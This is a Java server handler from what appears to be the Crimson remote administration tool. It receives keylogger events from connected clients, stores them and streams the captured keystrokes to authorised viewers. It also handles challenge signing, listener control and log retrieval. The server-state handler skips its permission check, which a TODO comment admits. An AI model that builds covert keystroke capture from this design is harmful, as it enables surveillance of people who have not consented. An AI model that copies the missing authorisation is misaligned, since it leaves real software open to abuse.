package com.subterranean_security.crimson.server.exe;

import java.util.Date;

import com.subterranean_security.crimson.core.attribute.keys.singular.AK_SERVER;
import com.subterranean_security.crimson.core.net.Connector;
import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
import com.subterranean_security.crimson.core.net.auth.KeyAuthGroup;
import com.subterranean_security.crimson.core.net.executor.temp.ExeI;
import com.subterranean_security.crimson.core.net.executor.temp.Exelet;
import com.subterranean_security.crimson.core.store.NetworkStore;
import com.subterranean_security.crimson.core.util.CryptoUtil;
import com.subterranean_security.crimson.core.util.ProtoUtil.PDFactory;
import com.subterranean_security.crimson.proto.core.Misc.Outcome;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RQ_GroupChallenge;
import com.subterranean_security.crimson.proto.core.net.sequences.ClientAuth.RS_GroupChallenge;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RQ_KeyUpdate;
import com.subterranean_security.crimson.proto.core.net.sequences.Keylogger.RS_KeyUpdate;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogFile;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.LogType;
import com.subterranean_security.crimson.proto.core.net.sequences.Log.RS_Logs;
import com.subterranean_security.crimson.proto.core.net.sequences.MSG.Message;
import com.subterranean_security.crimson.proto.core.net.sequences.State.RS_ChangeServerState;
import com.subterranean_security.crimson.sc.Logsystem;
import com.subterranean_security.crimson.server.store.AuthStore;
import com.subterranean_security.crimson.server.store.ListenerStore;
import com.subterranean_security.crimson.server.store.ServerProfileStore;
import com.subterranean_security.crimson.sv.permissions.Perm;
import com.subterranean_security.crimson.sv.profile.ClientProfile;
import com.subterranean_security.crimson.universal.Universal;

public class MiscExe extends Exelet implements ExeI {

	public MiscExe(Connector connector) {
		super(connector);
	}

	public void ev_kevent(Message m) {
		try {
			ServerProfileStore.getClient(connector.getCvid()).getKeylog().addEvent(m.getEvKevent());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public void rq_key_update(Message m) {
		RQ_KeyUpdate rq = m.getRqKeyUpdate();
		Date target = new Date(rq.getStartDate());

		// check permissions
		if (!ServerProfileStore.getViewer(connector.getCvid()).getPermissions().getFlag(rq.getCid(),
				Perm.client.keylogger.read_logs)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
			return;
		}

		ClientProfile cp = ServerProfileStore.getClient(rq.getCid());
		if (cp != null) {
			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
				connector.write(Message.newBuilder().setSid(rq.getCid()).setEvKevent(k).build());
			}
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
		} else {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
		}

	}

	public void rq_group_challenge(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE2) {
			return;
		}
		RQ_GroupChallenge rq = m.getRqGroupChallenge();
		KeyAuthGroup group = AuthStore.getGroup(rq.getGroupName());

		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder()
				.setResult(CryptoUtil.signGroupChallenge(rq.getMagic(), group.getPrivateKey())).build();
		connector.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
		try {
			Thread.sleep(100);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	public void rq_change_server_state(Message m) {
		// TODO check permissions
		String comment = "";
		boolean result = true;

		switch (m.getRqChangeServerState().getNewState()) {
		case FUNCTIONING_OFF:
			ListenerStore.stopAll();
			break;
		case FUNCTIONING_ON:
			ListenerStore.startAll();
			break;
		case RESTART:
			break;
		case SHUTDOWN:
			break;
		case UNINSTALL:
			break;
		default:
			break;
		}

		connector.write(Message.newBuilder().setId(m.getId()).setRsChangeServerState(RS_ChangeServerState.newBuilder()
				.setOutcome(Outcome.newBuilder().setResult(result).setComment(comment))).build());

		// apprise viewers
		NetworkStore.broadcastTo(Universal.Instance.VIEWER,
				new PDFactory(connector.getCvid()).add(AK_SERVER.ACTIVE_LISTENERS, ListenerStore.getActive())
						.add(AK_SERVER.INACTIVE_LISTENERS, ListenerStore.getInactive()).buildMsg());
	}

	public void rq_change_client_state(Message m) {

	}

	public void rq_logs(Message m) {
		RS_Logs.Builder rs = RS_Logs.newBuilder();
		if (m.getRqLogs().hasLog()) {
			rs.addLog(LogFile.newBuilder().setName(m.getRqLogs().getLog())
					.setLog(Logsystem.getLog(m.getRqLogs().getLog())));
		} else {
			for (LogType lt : Logsystem.getApplicableLogs()) {
				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
			}
		}
		connector.write(Message.newBuilder().setRsLogs(rs).build());
	}

}
